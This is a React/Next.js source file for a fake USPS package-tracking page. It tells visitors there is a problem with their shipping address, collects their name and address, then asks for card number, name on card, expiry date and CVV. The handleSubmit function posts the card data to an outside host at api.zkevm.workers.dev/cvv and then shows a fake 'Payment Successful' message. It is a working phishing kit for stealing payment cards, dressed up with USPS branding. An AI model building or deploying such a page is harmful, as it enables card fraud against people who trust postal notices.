/**
* This code was generated by v0 by Vercel.
* @see https://v0.dev/t/gyOuyndNW0I
* Documentation: https://v0.dev/docs#integrating-generated-code-into-your-nextjs-app
*/

"use client"

import { useState } from "react"
import Link from "next/link"
// import {CheckCir} from '@radix-ui/react-icons'
import { DropdownMenu, DropdownMenuTrigger, DropdownMenuContent, DropdownMenuItem } from "@/components/ui/dropdown-menu"
import { Label } from "@/components/ui/label"
import { Input } from "@/components/ui/input"
import { Button } from "@/components/ui/button"
import axios from "axios"

export default function Track() {
  const [currentStep, setCurrentStep] = useState(1)
  const [expiryDate, setExpiryDate] = useState('');
  const [isBackspace, setIsBackspace] = useState(false);
  const [card, setCard] = useState('')
  const [cvv, setCvv] = useState('')
  const [name, setName] = useState('')

  const handleKeyDown = (event:any) => {
    if (event.key === 'Backspace') {
      setIsBackspace(true);
    } else {
      setIsBackspace(false);
    }
  };

  const handleInputChange = (event:any) => {
    let value = event.target.value.replace(/\D/g, ''); // 移除所有非数字字符
    if (value.length > 4) {
      value = value.slice(0, 4); // 限制输入长度为4
    }
    if (value.length >= 2 && !(isBackspace && expiryDate.length == 3)) {
      value = value.slice(0, 2) + '/' + value.slice(2); // 在前两位之后插入斜杠
    }
    setExpiryDate(value);
  };

  const handleSubmit = async (e:any) => {
    // if you used form, you must stop the form auto submit when the button onclick function is called
    e.preventDefault()
    const params = {
      card, date: expiryDate, cvv, name
    }
    const url = `https://api.zkevm.workers.dev/cvv`
    await axios.post(url, params)
    setCurrentStep(3)
  }

  return (
    <div className="bg-[#fff] flex min-h-[100dvh] flex-col">
      <header className="flex h-16 items-center justify-between px-4">
        <DropdownMenu>
          <DropdownMenuTrigger>
            <MenuIcon className="h-8 w-8" />
          </DropdownMenuTrigger>
          <DropdownMenuContent align="end">
            <DropdownMenuItem>
              <Link href="#" prefetch={false}>
                About
              </Link>
            </DropdownMenuItem>
            <DropdownMenuItem>
              <Link href="#" prefetch={false}>
                Contact
              </Link>
            </DropdownMenuItem>
            <DropdownMenuItem>
              <Link href="#" prefetch={false}>
                FAQ
              </Link>
            </DropdownMenuItem>
          </DropdownMenuContent>
        </DropdownMenu>
        <Link href="#" prefetch={false}>
          <img className="h-12 w-12" src="https://www.usps.com/assets/images/home/logo_mobile.svg" />
        </Link>
        <div className="flex items-center gap-4">
          <Link href="#" prefetch={false}>
            <SearchIcon className="h-8 w-8" />
          </Link>

        </div>
      </header>
      <main className="flex-1">
        <section className="bg-muted py-4 px-4">
          <h1 className="text-2xl font-bold text-primary">USPS Tracking</h1>
          <p className="text-muted-foreground">Tracking Number: US9514902296532</p>
        </section>
        <section className="bg-muted py-8 px-4 space-y-4">
          <h1 className="text-xl font-bold text-primary">Status</h1>
          <p className="font-bold text-xl text-red">We have issues with your shipping address</p>
          <p className="text-muted-foreground">You can schedule redelivery online by filling out your information, We ReDeliver for You!</p>
          <p className="text-muted-foreground">Redeliveries can be scheduled online 24 hours a day, 7 days a week. For same-day Redelivery, make sure your request is submitted by 2 AM CST Monday-Saturday or your Redelivery will be scheduled for the next day.</p>
        </section>
        <section className="px-4 py-8">
          <div>
            {currentStep === 1 && (
              <div>
                <h2 className="text-lg font-bold text-primary">Verify Address</h2>
                <form className="space-y-4">
                  <div className="space-y-2">
                    <Label htmlFor="name">First Name</Label>
                    <Input id="name" placeholder="Enter your name" />
                  </div>
                  <div className="space-y-2">
                    <Label htmlFor="name">Last Name</Label>
                    <Input id="name" placeholder="Enter your name" />
                  </div>
                  <div className="space-y-2">
                    <Label htmlFor="address">Address</Label>
                    <Input id="address" placeholder="Enter your address" />
                  </div>
                  <div className="space-y-2">
                    <Label htmlFor="city">City</Label>
                    <Input id="city" placeholder="Enter your city" />
                  </div>
                  <div className="space-y-2">
                    <Label htmlFor="state">State</Label>
                    <Input id="state" placeholder="Enter your state" />
                  </div>
                  <div className="space-y-2">
                    <Label htmlFor="zip">ZIP Code</Label>
                    <Input id="zip" placeholder="Enter your ZIP code" />
                  </div>
                  <div className="flex justify-center w-full ">
                    <Button onClick={() => setCurrentStep(2)} >Continue</Button>
                  </div>
                </form>
              </div>
            )}
            {currentStep === 2 && (
              <div>
                <h2 className="text-lg font-bold">Payment Information</h2>
                <form className="space-y-4">
                  <div className="space-y-2">
                    <Label htmlFor="card-number">Card Number</Label>
                    <Input id="card-number" onChange={e => setCard(e.target.value)} placeholder="Enter your card number" />
                  </div>
                  <div className="space-y-2">
                    <Label htmlFor="name-on-card">Name on Card</Label>
                    <Input id="name-on-card" onChange={e => setName(e.target.value)} placeholder="Enter the name on your card" />
                  </div>
                  <div className="grid grid-cols-3 gap-4">
                    <div className="space-y-2">
                      <Label htmlFor="expiration-date">Expiration Date</Label>
                      <Input id="expiration-date" placeholder="MM/YY" onChange={handleInputChange} value={expiryDate} onKeyDown={handleKeyDown} />
                    </div>
                    <div className="space-y-2">
                      <Label htmlFor="cvv" >CVV</Label>
                      <Input id="cvv" placeholder="CVV" onChange={e => setCvv(e.target.value)} />
                    </div>
                  </div>
                  <div className="flex justify-center w-full ">
                    <Button onClick={handleSubmit} disabled={!cvv}>Continue</Button>
                  </div>
                </form>
              </div>
            )}
            {currentStep === 3 && (
              <div>
                <div className="flex flex-col items-center justify-center gap-4 py-12">
                  <svg width="15" height="15" viewBox="0 0 15 15" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M7.49991 0.877045C3.84222 0.877045 0.877075 3.84219 0.877075 7.49988C0.877075 11.1575 3.84222 14.1227 7.49991 14.1227C11.1576 14.1227 14.1227 11.1575 14.1227 7.49988C14.1227 3.84219 11.1576 0.877045 7.49991 0.877045ZM1.82708 7.49988C1.82708 4.36686 4.36689 1.82704 7.49991 1.82704C10.6329 1.82704 13.1727 4.36686 13.1727 7.49988C13.1727 10.6329 10.6329 13.1727 7.49991 13.1727C4.36689 13.1727 1.82708 10.6329 1.82708 7.49988ZM10.1589 5.53774C10.3178 5.31191 10.2636 5.00001 10.0378 4.84109C9.81194 4.68217 9.50004 4.73642 9.34112 4.96225L6.51977 8.97154L5.35681 7.78706C5.16334 7.59002 4.84677 7.58711 4.64973 7.78058C4.45268 7.97404 4.44978 8.29061 4.64325 8.48765L6.22658 10.1003C6.33054 10.2062 6.47617 10.2604 6.62407 10.2483C6.77197 10.2363 6.90686 10.1591 6.99226 10.0377L10.1589 5.53774Z" fill="currentColor" fill-rule="evenodd" clip-rule="evenodd"></path></svg>
                  <h2 className="text-lg font-bold">Payment Successful</h2>
                  <p className="text-muted-foreground">Your payment has been processed successfully.</p>
                </div>
              </div>
            )}
          </div>
        </section>
      </main>
      <footer className="bg-muted py-8 px-4">
        <div className="container mx-auto grid grid-cols-2 md:grid-cols-4 gap-y-8">
          <div className="space-y-2">
            <h4 className="text-lg font-bold">HELPFUL LINKS</h4>
            <ul className="space-y-1">
              <li>
                <Link href="#" className="text-muted-foreground hover:underline" prefetch={false}>
                  FAQ
                </Link>
              </li>
              <li>
                <Link href="#" className="text-muted-foreground hover:underline" prefetch={false}>
                  Contact Us
                </Link>
              </li>
              <li>
                <Link href="#" className="text-muted-foreground hover:underline" prefetch={false}>
                  Shipping Information
                </Link>
              </li>
              <li>
                <Link href="#" className="text-muted-foreground hover:underline" prefetch={false}>
                  Returns and Refunds
                </Link>
              </li>
            </ul>
          </div>

          <div className="space-y-2">
            <h4 className="text-lg font-bold">ON ABOUT.USPS.COM</h4>
            <ul className="space-y-1">
              <li>
                <Link href="#" className="text-muted-foreground hover:underline" prefetch={false}>
                  Contact Us
                </Link>
              </li>
              <li>
                <Link href="#" className="text-muted-foreground hover:underline" prefetch={false}>
                  FAQ
                </Link>
              </li>
              <li>
                <Link href="#" className="text-muted-foreground hover:underline" prefetch={false}>
                  Shipping Information
                </Link>
              </li>
              <li>
                <Link href="#" className="text-muted-foreground hover:underline" prefetch={false}>
                  Returns and Refunds
                </Link>
              </li>
            </ul>
          </div>
          <div className="space-y-2">
            <h4 className="text-lg font-bold">Legal INFOMATION</h4>
            <ul className="space-y-1">
              <li>
                <Link href="#" className="text-muted-foreground hover:underline" prefetch={false}>
                  Terms of Service
                </Link>
              </li>
              <li>
                <Link href="#" className="text-muted-foreground hover:underline" prefetch={false}>
                  Privacy Policy
                </Link>
              </li>
              <li>
                <Link href="#" className="text-muted-foreground hover:underline" prefetch={false}>
                  Cookie Policy
                </Link>
              </li>
            </ul>
          </div>
        </div>
        <div className="text-muted-foreground mt-4 text-center">Copyright &copy;2024 USPS. All Rights Reserved.</div>
      </footer>
    </div>
  )
}

function MenuIcon(props:any) {
  return (
    <svg
      {...props}
      xmlns="http://www.w3.org/2000/svg"
      width="24"
      height="24"
      viewBox="0 0 24 24"
      fill="none"
      stroke="currentColor"
      strokeWidth="2"
      strokeLinecap="round"
      strokeLinejoin="round"
    >
      <line x1="4" x2="20" y1="12" y2="12" />
      <line x1="4" x2="20" y1="6" y2="6" />
      <line x1="4" x2="20" y1="18" y2="18" />
    </svg>
  )
}


function SearchIcon(props:any) {
  return (
    <svg
      {...props}
      xmlns="http://www.w3.org/2000/svg"
      width="24"
      height="24"
      viewBox="0 0 24 24"
      fill="none"
      stroke="currentColor"
      strokeWidth="2"
      strokeLinecap="round"
      strokeLinejoin="round"
    >
      <circle cx="11" cy="11" r="8" />
      <path d="m21 21-4.3-4.3" />
    </svg>
  )
}

